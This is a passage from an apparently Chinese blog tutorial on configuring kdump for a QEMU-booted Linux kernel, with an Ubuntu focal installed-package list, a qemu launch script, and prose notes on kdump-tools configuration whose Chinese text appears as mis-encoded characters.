class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br></pre></td><td class="code"><pre><span class="line">adduser/focal,now 3.118ubuntu2 all [installed]</span><br><span class="line">alsa-topology-conf/focal,now 1.2.2-1 all [installed,automatic]</span><br><span class="line">alsa-ucm-conf/focal-updates,now 1.2.2-1ubuntu0.13 all [installed,automatic]</span><br><span class="line">apport-symptoms/focal,now 0.23 all [installed,automatic]</span><br><span class="line">apport/focal-updates,now 2.20.11-0ubuntu27.27 all [installed,automatic]</span><br><span class="line">apt/focal-updates,now 2.0.10 amd64 [installed]</span><br><span class="line">base-files/focal-updates,now 11ubuntu5.8 amd64 [installed]</span><br><span class="line">base-passwd/focal,now 3.5.47 amd64 [installed]</span><br><span class="line">bash-completion/focal,now 1:2.10-1ubuntu1 all [installed]</span><br><span class="line">bash/focal-updates,focal-security,now 5.0-6ubuntu1.2 amd64 [installed]</span><br><span class="line">binutils-common/focal-updates,focal-security,now 2.34-6ubuntu1.10 amd64 [installed,automatic]</span><br><span class="line">binutils-x86-64-linux-gnu/focal-updates,focal-security,now 2.34-6ubuntu1.10 amd64 [installed,automatic]</span><br><span class="line">binutils/focal-updates,focal-security,now 2.34-6ubuntu1.10 amd64 [installed,automatic]</span><br><span class="line">bsdmainutils/focal,now 11.1.2ubuntu3 amd64 [installed,automatic]</span><br><span class="line">bsdutils/focal-updates,focal-security,now 1:2.34-0.1ubuntu9.6 amd64 [installed]</span><br><span class="line">busybox-initramfs/focal-updates,focal-security,now 1:1.30.1-4ubuntu6.5 amd64 [installed,automatic]</span><br><span class="line">bzip2/focal,now 1.0.8-2 amd64 [installed]</span><br><span class="line">ca-certificates/focal-updates,focal-security,now 20240203~20.04.1 all [installed,automatic]</span><br><span class="line">coreutils/focal,now 8.30-3ubuntu2 amd64 [installed]</span><br><span class="line">cpio/focal-updates,focal-security,now 2.13+dfsg-2ubuntu0.4 amd64 [installed,automatic]</span><br><span class="line">crash/focal-updates,now 7.2.8-1ubuntu1.20.04.1 amd64 [installed,automatic]</span><br><span class="line">dash/focal,now 0.5.10.2-6 amd64 [installed]</span><br><span class="line">dbus/focal-updates,focal-security,now 1.12.16-2ubuntu2.3 amd64 [installed,automatic]</span><br><span class="line">debconf/focal,now 1.5.73 all [installed]</span><br><span class="line">debianutils/focal,now 4.9.1 amd64 [installed]</span><br><span class="line">diffutils/focal,now 1:3.7-3 amd64 [installed]</span><br><span class="line">distro-info-data/focal-updates,now 0.43ubuntu1.17 all [installed,automatic]</span><br><span class="line">dmsetup/focal,now 2:1.02.167-1ubuntu1 amd64 [installed,automatic]</span><br><span class="line">dpkg/focal-updates,focal-security,now 1.19.7ubuntu3.2 amd64 [installed]</span><br><span class="line">e2fsprogs/focal-updates,now 1.45.5-2ubuntu1.2 amd64 [installed]</span><br><span class="line">fdisk/focal-updates,focal-security,now 2.34-0.1ubuntu9.6 amd64 [installed]</span><br><span class="line">file/focal,now 1:5.38-4 amd64 [installed,automatic]</span><br><span class="line">findutils/focal,now 4.7.0-1ubuntu1 amd64 [installed]</span><br><span class="line">gcc-10-base/focal-updates,focal-security,now 10.5.0-1ubuntu1~20.04 amd64 [installed]</span><br><span class="line">gettext-base/focal,now 0.19.8.1-10build1 amd64 [installed,automatic]</span><br><span class="line">gir1.2-glib-2.0/focal-updates,now 1.64.1-1~ubuntu20.04.1 amd64 [installed,automatic]</span><br><span class="line">gpgv/focal-updates,focal-security,now 2.2.19-3ubuntu2.2 amd64 [installed]</span><br><span class="line">grep/focal,now 3.4-1 amd64 [installed]</span><br><span class="line">grub-common/focal-updates,now 2.04-1ubuntu26.17 amd64 [installed,automatic]</span><br><span class="line">grub-gfxpayload-lists/focal,now 0.7 amd64 [installed,automatic]</span><br><span class="line">grub-pc-bin/focal-updates,now 2.04-1ubuntu26.17 amd64 [installed,automatic]</span><br><span class="line">grub-pc/focal-updates,now 2.04-1ubuntu26.17 amd64 [installed,automatic]</span><br><span class="line">grub2-common/focal-updates,now 2.04-1ubuntu26.17 amd64 [installed,automatic]</span><br><span class="line">gzip/focal-updates,focal-security,now 1.10-0ubuntu4.1 amd64 [installed]</span><br><span class="line">hostname/focal,now 3.23 amd64 [installed]</span><br><span class="line">init-system-helpers/focal,now 1.57 all [installed]</span><br><span class="line">init/focal,now 1.57 amd64 [installed]</span><br><span class="line">initramfs-tools-bin/focal-updates,now 0.136ubuntu6.7 amd64 [installed,automatic]</span><br><span class="line">initramfs-tools-core/focal-updates,now 0.136ubuntu6.7 all [installed,automatic]</span><br><span class="line">initramfs-tools/focal-updates,now 0.136ubuntu6.7 all [installed,automatic]</span><br><span class="line">iputils-ping/focal-updates,now 3:20190709-3ubuntu1 amd64 [installed]</span><br><span class="line">iso-codes/focal,now 4.4-1 all [installed,automatic]</span><br><span class="line">kdump-tools/focal-updates,now 1:1.6.7-1ubuntu2.5 amd64 [installed]</span><br><span class="line">kexec-tools/focal-updates,now 1:2.0.18-1ubuntu1.1 amd64 [installed]</span><br><span class="line">klibc-utils/focal-updates,focal-security,now 2.0.7-1ubuntu5.2 amd64 [installed,automatic]</span><br><span class="line">kmod/focal-updates,now 27-1ubuntu2.1 amd64 [installed,automatic]</span><br><span class="line">libacl1/focal,now 2.2.53-6 amd64 [installed]</span><br><span class="line">libapparmor1/focal-updates,focal-security,now 2.13.3-7ubuntu5.4 amd64 [installed,automatic]</span><br><span class="line">libapt-pkg6.0/focal-updates,now 2.0.10 amd64 [installed]</span><br><span class="line">libargon2-1/focal,now 0~20171227-0.2 amd64 [installed,automatic]</span><br><span class="line">libasound2-data/focal-updates,now 1.2.2-2.1ubuntu2.5 all [installed,automatic]</span><br><span class="line">libasound2/focal-updates,now 1.2.2-2.1ubuntu2.5 amd64 [installed,automatic]</span><br><span class="line">libattr1/focal,now 1:2.4.48-5 amd64 [installed]</span><br><span class="line">libaudit-common/focal,now 1:2.8.5-2ubuntu6 all [installed]</span><br><span class="line">libaudit1/focal,now 1:2.8.5-2ubuntu6 amd64 [installed]</span><br><span class="line">libbinutils/focal-updates,focal-security,now 2.34-6ubuntu1.10 amd64 [installed,automatic]</span><br><span class="line">libblkid1/focal-updates,focal-security,now 2.34-0.1ubuntu9.6 amd64 [installed]</span><br><span class="line">libbsd0/focal,now 0.10.0-1 amd64 [installed,automatic]</span><br><span class="line">libbz2-1.0/focal,now 1.0.8-2 amd64 [installed]</span><br><span class="line">libc-bin/focal-updates,focal-security,now 2.31-0ubuntu9.17 amd64 [installed]</span><br><span class="line">libc6/focal-updates,focal-security,now 2.31-0ubuntu9.17 amd64 [installed]</span><br><span class="line">libcanberra0/focal,now 0.30-7ubuntu1 amd64 [installed,automatic]</span><br><span class="line">libcap-ng0/focal,now 0.7.9-2.1build1 amd64 [installed]</span><br><span class="line">libcap2-bin/focal-updates,focal-security,now 1:2.32-1ubuntu0.2 amd64 [installed,automatic]</span><br><span class="line">libcap2/focal-updates,focal-security,now 1:2.32-1ubuntu0.2 amd64 [installed,automatic]</span><br><span class="line">libcom-err2/focal-updates,now 1.45.5-2ubuntu1.2 amd64 [installed]</span><br><span class="line">libcrypt1/focal,now 1:4.4.10-10ubuntu4 amd64 [installed]</span><br><span class="line">libcryptsetup12/focal-updates,focal-security,now 2:2.2.2-3ubuntu2.4 amd64 [installed,automatic]</span><br><span class="line">libctf-nobfd0/focal-updates,focal-security,now 2.34-6ubuntu1.10 amd64 [installed,automatic]</span><br><span class="line">libctf0/focal-updates,focal-security,now 2.34-6ubuntu1.10 amd64 [installed,automatic]</span><br><span class="line">libdb5.3/focal,now 5.3.28+dfsg1-0.6ubuntu2 amd64 [installed]</span><br><span class="line">libdbus-1-3/focal-updates,focal-security,now 1.12.16-2ubuntu2.3 amd64 [installed,automatic]</span><br><span class="line">libdebconfclient0/focal,now 0.251ubuntu1 amd64 [installed]</span><br><span class="line">libdevmapper1.02.1/focal,now 2:1.02.167-1ubuntu1 amd64 [installed,automatic]</span><br><span class="line">libdw1/focal-updates,focal-security,now 0.176-1.1ubuntu0.1 amd64 [installed,automatic]</span><br><span class="line">libefiboot1/focal-updates,now 37-2ubuntu2.2 amd64 [installed,automatic]</span><br><span class="line">libefivar1/focal-updates,now 37-2ubuntu2.2 amd64 [installed,automatic]</span><br><span class="line">libelf1/focal-updates,focal-security,now 0.176-1.1ubuntu0.1 amd64 [installed,automatic]</span><br><span class="line">libexpat1/focal-updates,focal-security,now 2.2.9-1ubuntu0.8 amd64 [installed,automatic]</span><br><span class="line">libext2fs2/focal-updates,now 1.45.5-2ubuntu1.2 amd64 [installed]</span><br><span class="line">libfdisk1/focal-updates,focal-security,now 2.34-0.1ubuntu9.6 amd64 [installed]</span><br><span class="line">libffi7/focal,now 3.3-4 amd64 [installed]</span><br><span class="line">libfreetype6/focal-updates,focal-security,now 2.10.1-2ubuntu0.4 amd64 [installed,automatic]</span><br><span class="line">libfuse2/focal,now 2.9.9-3 amd64 [installed,automatic]</span><br><span class="line">libgcc-s1/focal-updates,focal-security,now 10.5.0-1ubuntu1~20.04 amd64 [installed]</span><br><span class="line">libgcrypt20/focal-updates,focal-security,now 1.8.5-5ubuntu1.1 amd64 [installed]</span><br><span class="line">libgdbm-compat4/focal,now 1.18.1-5 amd64 [installed,automatic]</span><br><span class="line">libgdbm6/focal,now 1.18.1-5 amd64 [installed,automatic]</span><br><span class="line">libgirepository-1.0-1/focal-updates,now 1.64.1-1~ubuntu20.04.1 amd64 [installed,automatic]</span><br><span class="line">libglib2.0-0/focal-updates,focal-security,now 2.64.6-1~ubuntu20.04.8 amd64 [installed,automatic]</span><br><span class="line">libglib2.0-data/focal-updates,focal-security,now 2.64.6-1~ubuntu20.04.8 all [installed,automatic]</span><br><span class="line">libgmp10/focal-updates,focal-security,now 2:6.2.0+dfsg-4ubuntu0.1 amd64 [installed]</span><br><span class="line">libgnutls30/focal-updates,focal-security,now 3.6.13-2ubuntu1.12 amd64 [installed]</span><br><span class="line">libgpg-error0/focal,now 1.37-1 amd64 [installed]</span><br><span class="line">libgpm2/focal,now 1.20.7-5 amd64 [installed,automatic]</span><br><span class="line">libhogweed5/focal-updates,focal-security,now 3.5.1+really3.5.1-2ubuntu0.2 amd64 [installed]</span><br><span class="line">libicu66/focal-updates,focal-security,now 66.1-2ubuntu2.1 amd64 [installed,automatic]</span><br><span class="line">libidn2-0/focal,now 2.2.0-2 amd64 [installed]</span><br><span class="line">libip4tc2/focal-updates,now 1.8.4-3ubuntu2.1 amd64 [installed,automatic]</span><br><span class="line">libjson-c4/focal-updates,focal-security,now 0.13.1+dfsg-7ubuntu0.3 amd64 [installed,automatic]</span><br><span class="line">libklibc/focal-updates,focal-security,now 2.0.7-1ubuntu5.2 amd64 [installed,automatic]</span><br><span class="line">libkmod2/focal-updates,now 27-1ubuntu2.1 amd64 [installed,automatic]</span><br><span class="line">libltdl7/focal,now 2.4.6-14 amd64 [installed,automatic]</span><br><span class="line">liblz4-1/focal-updates,focal-security,now 1.9.2-2ubuntu0.20.04.1 amd64 [installed]</span><br><span class="line">liblzma5/focal-updates,focal-security,now 5.2.4-1ubuntu1.1 amd64 [installed]</span><br><span class="line">liblzo2-2/focal,now 2.10-2 amd64 [installed,automatic]</span><br><span class="line">libmagic-mgc/focal,now 1:5.38-4 amd64 [installed,automatic]</span><br><span class="line">libmagic1/focal,now 1:5.38-4 amd64 [installed,automatic]</span><br><span class="line">libmount1/focal-updates,focal-security,now 2.34-0.1ubuntu9.6 amd64 [installed]</span><br><span class="line">libmpdec2/focal,now 2.4.2-3 amd64 [installed,automatic]</span><br><span class="line">libncurses6/focal-updates,focal-security,now 6.2-0ubuntu2.1 amd64 [installed]</span><br><span class="line">libncursesw6/focal-updates,focal-security,now 6.2-0ubuntu2.1 amd64 [installed]</span><br><span class="line">libnettle7/focal-updates,focal-security,now 3.5.1+really3.5.1-2ubuntu0.2 amd64 [installed]</span><br><span class="line">libnss-systemd/focal-updates,now 245.4-4ubuntu3.24 amd64 [installed,automatic]</span><br><span class="line">libogg0/focal,now 1.3.4-0ubuntu1 amd64 [installed,automatic]</span><br><span class="line">libp11-kit0/focal-updates,focal-security,now 0.23.20-1ubuntu0.1 amd64 [installed]</span><br><span class="line">libpam-cap/focal-updates,focal-security,now 1:2.32-1ubuntu0.2 amd64 [installed,automatic]</span><br><span class="line">libpam-modules-bin/focal-updates,focal-security,now 1.3.1-5ubuntu4.7 amd64 [installed]</span><br><span class="line">libpam-modules/focal-updates,focal-security,now 1.3.1-5ubuntu4.7 amd64 [installed]</span><br><span class="line">libpam-runtime/focal-updates,focal-security,now 1.3.1-5ubuntu4.7 all [installed]</span><br><span class="line">libpam-systemd/focal-updates,now 245.4-4ubuntu3.24 amd64 [installed,automatic]</span><br><span class="line">libpam0g/focal-updates,focal-security,now 1.3.1-5ubuntu4.7 amd64 [installed]</span><br><span class="line">libpcre2-8-0/focal-updates,focal-security,now 10.34-7ubuntu0.1 amd64 [installed]</span><br><span class="line">libpcre3/focal-updates,focal-security,now 2:8.39-12ubuntu0.1 amd64 [installed]</span><br><span class="line">libperl5.30/focal-updates,focal-security,now 5.30.0-9ubuntu0.5 amd64 [installed,automatic]</span><br><span class="line">libpng16-16/focal,now 1.6.37-2 amd64 [installed,automatic]</span><br><span class="line">libprocps8/focal-updates,focal-security,now 2:3.3.16-1ubuntu2.4 amd64 [installed]</span><br><span class="line">libpython3-stdlib/focal,now 3.8.2-0ubuntu2 amd64 [installed,automatic]</span><br><span class="line">libpython3.8-minimal/focal-updates,focal-security,now 3.8.10-0ubuntu1~20.04.17 amd64 [installed,automatic]</span><br><span class="line">libpython3.8-stdlib/focal-updates,focal-security,now 3.8.10-0ubuntu1~20.04.17 amd64 [installed,automatic]</span><br><span class="line">libpython3.8/focal-updates,focal-security,now 3.8.10-0ubuntu1~20.04.17 amd64 [installed,automatic]</span><br><span class="line">libreadline8/focal,now 8.0-4 amd64 [installed,automatic]</span><br><span class="line">libseccomp2/focal-updates,focal-security,now 2.5.1-1ubuntu1~20.04.2 amd64 [installed]</span><br><span class="line">libselinux1/focal,now 3.0-1build2 amd64 [installed]</span><br><span class="line">libsemanage-common/focal,now 3.0-1build2 all [installed]</span><br><span class="line">libsemanage1/focal,now 3.0-1build2 amd64 [installed]</span><br><span class="line">libsepol1/focal-updates,focal-security,now 3.0-1ubuntu0.1 amd64 [installed]</span><br><span class="line">libsmartcols1/focal-updates,focal-security,now 2.34-0.1ubuntu9.6 amd64 [installed]</span><br><span class="line">libsnappy1v5/focal,now 1.1.8-1build1 amd64 [installed,automatic]</span><br><span class="line">libsqlite3-0/focal-updates,focal-security,now 3.31.1-4ubuntu0.6 amd64 [installed,automatic]</span><br><span class="line">libss2/focal-updates,now 1.45.5-2ubuntu1.2 amd64 [installed]</span><br><span class="line">libssl1.1/focal-updates,focal-security,now 1.1.1f-1ubuntu2.24 amd64 [installed,automatic]</span><br><span class="line">libstdc++6/focal-updates,focal-security,now 10.5.0-1ubuntu1~20.04 amd64 [installed]</span><br><span class="line">libsystemd0/focal-updates,now 245.4-4ubuntu3.24 amd64 [installed]</span><br><span class="line">libtasn1-6/focal-updates,focal-security,now 4.16.0-2ubuntu0.1 amd64 [installed]</span><br><span class="line">libtdb1/focal-updates,focal-security,now 1.4.5-0ubuntu0.20.04.1 amd64 [installed,automatic]</span><br><span class="line">libtinfo6/focal-updates,focal-security,now 6.2-0ubuntu2.1 amd64 [installed]</span><br><span class="line">libudev1/focal-updates,now 245.4-4ubuntu3.24 amd64 [installed]</span><br><span class="line">libunistring2/focal,now 0.9.10-2 amd64 [installed]</span><br><span class="line">libuuid1/focal-updates,focal-security,now 2.34-0.1ubuntu9.6 amd64 [installed]</span><br><span class="line">libvorbis0a/focal,now 1.3.6-2ubuntu1 amd64 [installed,automatic]</span><br><span class="line">libvorbisfile3/focal,now 1.3.6-2ubuntu1 amd64 [installed,automatic]</span><br><span class="line">libxml2/focal-updates,focal-security,now 2.9.10+dfsg-5ubuntu0.20.04.9 amd64 [installed,automatic]</span><br><span class="line">libzstd1/focal-updates,focal-security,now 1.4.4+dfsg-3ubuntu0.1 amd64 [installed]</span><br><span class="line">linux-base/focal-updates,now 4.5ubuntu3.7 all [installed,automatic]</span><br><span class="line">linux-crashdump/focal-updates,focal-security,now 5.4.0.208.204 amd64 [installed]</span><br><span class="line">linux-image-5.4.0-1127-kvm/focal-updates,focal-security,now 5.4.0-1127.136 amd64 [installed,automatic]</span><br><span class="line">linux-modules-5.4.0-1127-kvm/focal-updates,focal-security,now 5.4.0-1127.136 amd64 [installed,automatic]</span><br><span class="line">locales/focal-updates,focal-security,now 2.31-0ubuntu9.17 all [installed]</span><br><span class="line">login/focal-updates,focal-security,now 1:4.8.1-1ubuntu5.20.04.5 amd64 [installed]</span><br><span class="line">logsave/focal-updates,now 1.45.5-2ubuntu1.2 amd64 [installed]</span><br><span class="line">lsb-base/focal,now 11.1.0ubuntu2 all [installed]</span><br><span class="line">lsb-release/focal,now 11.1.0ubuntu2 all [installed,automatic]</span><br><span class="line">lz4/focal-updates,focal-security,now 1.9.2-2ubuntu0.20.04.1 amd64 [installed,automatic]</span><br><span class="line">makedumpfile/focal-updates,now 1:1.6.7-1ubuntu2.5 amd64 [installed,automatic]</span><br><span class="line">mawk/focal,now 1.3.4.20200120-2 amd64 [installed]</span><br><span class="line">mime-support/focal,now 3.64ubuntu1 all [installed,automatic]</span><br><span class="line">mount/focal-updates,focal-security,now 2.34-0.1ubuntu9.6 amd64 [installed]</span><br><span class="line">ncurses-base/focal-updates,focal-security,now 6.2-0ubuntu2.1 all [installed]</span><br><span class="line">ncurses-bin/focal-updates,focal-security,now 6.2-0ubuntu2.1 amd64 [installed]</span><br><span class="line">netbase/focal,now 6.1 all [installed,automatic]</span><br><span class="line">networkd-dispatcher/focal-updates,focal-security,now 2.1-2~ubuntu20.04.3 all [installed,automatic]</span><br><span class="line">openssl/focal-updates,focal-security,now 1.1.1f-1ubuntu2.24 amd64 [installed,automatic]</span><br><span class="line">os-prober/focal,now 1.74ubuntu2 amd64 [installed,automatic]</span><br><span class="line">passwd/focal-updates,focal-security,now 1:4.8.1-1ubuntu5.20.04.5 amd64 [installed]</span><br><span class="line">perl-base/focal-updates,focal-security,now 5.30.0-9ubuntu0.5 amd64 [installed]</span><br><span class="line">perl-modules-5.30/focal-updates,focal-security,now 5.30.0-9ubuntu0.5 all [installed,automatic]</span><br><span class="line">perl/focal-updates,focal-security,now 5.30.0-9ubuntu0.5 amd64 [installed,automatic]</span><br><span class="line">procps/focal-updates,focal-security,now 2:3.3.16-1ubuntu2.4 amd64 [installed]</span><br><span class="line">python-apt-common/focal-updates,now 2.0.1ubuntu0.20.04.1 all [installed,automatic]</span><br><span class="line">python3-apport/focal-updates,now 2.20.11-0ubuntu27.27 all [installed,automatic]</span><br><span class="line">python3-apt/focal-updates,now 2.0.1ubuntu0.20.04.1 amd64 [installed,automatic]</span><br><span class="line">python3-blinker/focal,now 1.4+dfsg1-0.3ubuntu1 all [installed,automatic]</span><br><span class="line">python3-certifi/focal,now 2019.11.28-1 all [installed,automatic]</span><br><span class="line">python3-cffi-backend/focal,now 1.14.0-1build1 amd64 [installed,automatic]</span><br><span class="line">python3-chardet/focal,now 3.0.4-4build1 all [installed,automatic]</span><br><span class="line">python3-cryptography/focal-updates,focal-security,now 2.8-3ubuntu0.3 amd64 [installed,automatic]</span><br><span class="line">python3-dbus/focal,now 1.2.16-1build1 amd64 [installed,automatic]</span><br><span class="line">python3-distro/focal,now 1.4.0-1 all [installed,automatic]</span><br><span class="line">python3-entrypoints/focal,now 0.3-2ubuntu1 all [installed,automatic]</span><br><span class="line">python3-gi/focal,now 3.36.0-1 amd64 [installed,automatic]</span><br><span class="line">python3-httplib2/focal,now 0.14.0-1ubuntu1 all [installed,automatic]</span><br><span class="line">python3-idna/focal-updates,focal-security,now 2.8-1ubuntu0.1 all [installed,automatic]</span><br><span class="line">python3-jwt/focal-updates,focal-security,now 1.7.1-2ubuntu2.1 all [installed,automatic]</span><br><span class="line">python3-keyring/focal,now 18.0.1-2ubuntu1 all [installed,automatic]</span><br><span class="line">python3-launchpadlib/focal,now 1.10.13-1 all [installed,automatic]</span><br><span class="line">python3-lazr.restfulclient/focal,now 0.14.2-2build1 all [installed,automatic]</span><br><span class="line">python3-lazr.uri/focal,now 1.0.3-4build1 all [installed,automatic]</span><br><span class="line">python3-minimal/focal,now 3.8.2-0ubuntu2 amd64 [installed,automatic]</span><br><span class="line">python3-oauthlib/focal,now 3.1.0-1ubuntu2 all [installed,automatic]</span><br><span class="line">python3-pkg-resources/focal-updates,focal-security,now 45.2.0-1ubuntu0.2 all [installed,automatic]</span><br><span class="line">python3-problem-report/focal-updates,now 2.20.11-0ubuntu27.27 all [installed,automatic]</span><br><span class="line">python3-requests-unixsocket/focal,now 0.2.0-2 all [installed,automatic]</span><br><span class="line">python3-requests/focal-updates,focal-security,now 2.22.0-2ubuntu1.1 all [installed,automatic]</span><br><span class="line">python3-secretstorage/focal,now 2.3.1-2ubuntu1 all [installed,automatic]</span><br><span class="line">python3-simplejson/focal,now 3.16.0-2ubuntu2 amd64 [installed,automatic]</span><br><span class="line">python3-six/focal,now 1.14.0-2 all [installed,automatic]</span><br><span class="line">python3-systemd/focal,now 234-3build2 amd64 [installed,automatic]</span><br><span class="line">python3-urllib3/focal-updates,focal-security,now 1.25.8-2ubuntu0.4 all [installed,automatic]</span><br><span class="line">python3-wadllib/focal,now 1.3.3-3build1 all [installed,automatic]</span><br><span class="line">python3.8-minimal/focal-updates,focal-security,now 3.8.10-0ubuntu1~20.04.17 amd64 [installed,automatic]</span><br><span class="line">python3.8/focal-updates,focal-security,now 3.8.10-0ubuntu1~20.04.17 amd64 [installed,automatic]</span><br><span class="line">python3/focal,now 3.8.2-0ubuntu2 amd64 [installed,automatic]</span><br><span class="line">readline-common/focal,now 8.0-4 all [installed,automatic]</span><br><span class="line">sed/focal,now 4.7-1 amd64 [installed]</span><br><span class="line">sensible-utils/focal,now 0.0.12+nmu1 all [installed]</span><br><span class="line">shared-mime-info/focal,now 1.15-1 amd64 [installed,automatic]</span><br><span class="line">sound-theme-freedesktop/focal,now 0.8-2ubuntu1 all [installed,automatic]</span><br><span class="line">systemd-sysv/focal-updates,now 245.4-4ubuntu3.24 amd64 [installed,automatic]</span><br><span class="line">systemd-timesyncd/focal-updates,now 245.4-4ubuntu3.24 amd64 [installed,automatic]</span><br><span class="line">systemd/focal-updates,now 245.4-4ubuntu3.24 amd64 [installed]</span><br><span class="line">sysvinit-utils/focal,now 2.96-2.1ubuntu1 amd64 [installed]</span><br><span class="line">tar/focal-updates,focal-security,now 1.30+dfsg-7ubuntu0.20.04.4 amd64 [installed]</span><br><span class="line">tzdata/focal-updates,focal-security,now 2024b-0ubuntu0.20.04.1 all [installed,automatic]</span><br><span class="line">ubuntu-keyring/focal-updates,now 2020.02.11.4 all [installed]</span><br><span class="line">ucf/focal,now 3.0038+nmu1 all [installed,automatic]</span><br><span class="line">udev/focal-updates,now 245.4-4ubuntu3.24 amd64 [installed,automatic]</span><br><span class="line">util-linux/focal-updates,focal-security,now 2.34-0.1ubuntu9.6 amd64 [installed]</span><br><span class="line">vim-common/focal-updates,focal-security,now 2:8.1.2269-1ubuntu5.31 all [installed,automatic]</span><br><span class="line">vim-runtime/focal-updates,focal-security,now 2:8.1.2269-1ubuntu5.31 all [installed,automatic]</span><br><span class="line">vim/focal-updates,focal-security,now 2:8.1.2269-1ubuntu5.31 amd64 [installed]</span><br><span class="line">xdg-user-dirs/focal,now 0.17-2ubuntu1 amd64 [installed,automatic]</span><br><span class="line">xxd/focal-updates,focal-security,now 2:8.1.2269-1ubuntu5.31 amd64 [installed,automatic]</span><br><span class="line">xz-utils/focal-updates,focal-security,now 5.2.4-1ubuntu1.1 amd64 [installed,automatic]</span><br><span class="line">zlib1g/focal-updates,focal-security,now 1:1.2.11.dfsg-2ubuntu1.5 amd64 [installed]</span><br></pre></td></tr></table></figure><h1>3. kdump</h1><p>umountåqemuå¯åŠ¨è¿›å»ã€‚æˆ‘çš„qemuçš„å¯åŠ¨è„šæœ¬å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-x86_64 -m 1G\</span><br><span class="line">-append &quot;nokaslr console=ttyS0 root=/dev/sda earlyprintk=serial rw loglevel=8 crashkernel=256M&quot; \</span><br><span class="line">-kernel linux-6.13.7/arch/x86/boot/bzImage \</span><br><span class="line">    -drive file=newrootfs.img,format=raw \</span><br><span class="line">-nographic \</span><br><span class="line">    -smp 1 \</span><br><span class="line">    -enable-kvm \</span><br><span class="line">    -netdev user,id=mynic0 -device e1000,netdev=mynic0,mac=52:54:98:76:54:32 \</span><br><span class="line">    -pidfile vm.pid \</span><br><span class="line">    2&gt;&amp;1 | tee vm.log</span><br></pre></td></tr></table></figure><p>å…¶ä¸­ï¼Œkexecè¦æƒ³è¿è¡Œï¼Œå†…æ ¸å‚æ•°éœ€è¦ä¼ å…¥crashkernelã€‚åŒæ—¶è¦æä¾›rwå‚æ•°è®©ç³»ç»Ÿèƒ½å¤Ÿå†™å…¥é•œåƒã€‚å¦‚æœä¸€åˆ‡é¡ºåˆ©ï¼Œä½ è¿™æ—¶ä¼šåœ¨systemdçš„å¯åŠ¨æ—¥å¿—ä¸­çœ‹åˆ°kdumpç›¸å…³çš„è¾“å‡ºï¼Œå½“ç„¶è¿™é‡Œæˆ‘ä»¬è¿˜æ²¡æœ‰é…ç½®æ‰€ä»¥åº”è¯¥æ˜¯å¤±è´¥ã€‚</p><p>kdumpé»˜è®¤ä¼šä»<code>/var/lib/kdump</code>ç›®å½•ä¸‹é¢æŸ¥æ‰¾initrdå’Œvmlinuzç¬¦å·é“¾æ¥ï¼Œæˆ‘ä»¬ç”¨qemuèµ·çš„å†…æ ¸å½“ç„¶æ˜¯æ²¡æœ‰çš„ã€‚å…¶é…ç½®æ–‡ä»¶ä½äº<code>/etc/default/kdump-tools</code>ï¼Œåªéœ€è¦ç¼–è¾‘è¿™ä¸ªæ–‡ä»¶ä¿®æ”¹è·¯å¾„å³å¯ã€‚åˆšåˆšchrootçš„æ—¶å€™copyå†…æ ¸vmlinuzå’Œinitrdè¿›å»ï¼Œå¹¶åœ¨é…ç½®æ–‡ä»¶ä¸­æŒ‡æ˜ä»–ä»¬çš„è·¯å¾„ã€‚ä½ ä¹Ÿå¯ä»¥é…ç½®è‡ªå·±çš„makedumpfileå’Œkexecå‚æ•°ã€‚</p><p>kdumpæä¾›äº†å‘½ä»¤<code>kdump-config</code>ï¼Œç”¨statusæˆ–è€…showå¯ä»¥çœ‹åˆ°ä¸€äº›ä¿¡æ¯ã€‚å¦‚æœæ˜¯ready to 